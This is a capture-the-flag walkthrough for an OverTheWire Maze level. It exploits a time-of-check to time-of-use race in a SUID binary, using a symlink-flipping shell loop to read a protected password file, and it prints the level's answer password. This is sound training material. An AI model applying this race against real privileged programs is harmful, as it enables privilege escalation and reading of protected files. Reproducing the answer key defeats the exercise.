# Maze Level 0 → 1

## Goal
Exploit a TOCTOU (time-of-check to time-of-use) race condition in a SUID binary to trick it into reading `/etc/maze_pass/maze1` instead of the world-readable decoy file it is supposed to print.

## Concepts you'll learn
- What a race condition (TOCTOU) is and why SUID binaries are a classic target.
- Using `ln -sf` to atomically flip a symlink between two targets.
- Writing a tight shell loop to win a narrow timing window.
- Filtering noisy loop output with `grep` to catch the one-in-many success.

## How to log in

```
$ ssh maze0@maze.labs.overthewire.org -p 2225
```

Use the password from the Maze landing page on overthewire.org to get into `maze0`.

## Walkthrough

### 1. Read the binary and understand the bug
The SUID helper `access(2)`-checks a file path, then later `open(2)`s/reads it after elevating privileges. Between the check and the read, an attacker can swap the path (via a symlink) so the check passes on a file the attacker owns, but the privileged read lands on a file only `maze1` can read.

The target that the binary reads is `/tmp/128ecf542a35ac5270a87dc740918404`.

### 2. Set up the symlink flip
Pick a working directory in `/tmp` (you have write access). We will repeatedly overwrite the target path so it points at either a harmless file you own or the real prize `/etc/maze_pass/maze1`. `ln -sf` replaces an existing symlink atomically, which is exactly what we need.

```
$ cd /tmp
$ touch /tmp/dummy
```

### 3. Race the binary
Open two SSH sessions (or use `tmux`/`screen`). In one, flip the symlink forever:

```
$ while true; do
    ln -sf /tmp/dummy /tmp/128ecf542a35ac5270a87dc740918404
    ln -sf /etc/maze_pass/maze1 /tmp/128ecf542a35ac5270a87dc740918404
  done
```

In the other, run the SUID binary in a loop and keep only lines that look like a password (10 alphanumeric characters). Adjust the grep if the shape of the output differs on your run.

```
$ while true; do /maze/maze0; done | grep -E '^[A-Za-z0-9]{10}$'
```

Expected output (eventually — may take a few seconds to minutes):

```
kfL7RRfpkY
```

Kill both loops once you see a candidate.

### 4. Log in as maze1

```
$ ssh maze1@maze.labs.overthewire.org -p 2225
```

## The answer

The password for `maze1` is:

**`kfL7RRfpkY`**

> ⚠️ OverTheWire may rotate passwords without notice. This value was correct at the time the level was solved — if it fails for you, re-solve the level using the method above rather than assuming the writeup is wrong.

## Reference

- Official level page: <https://overthewire.org/wargames/maze/maze0.html>
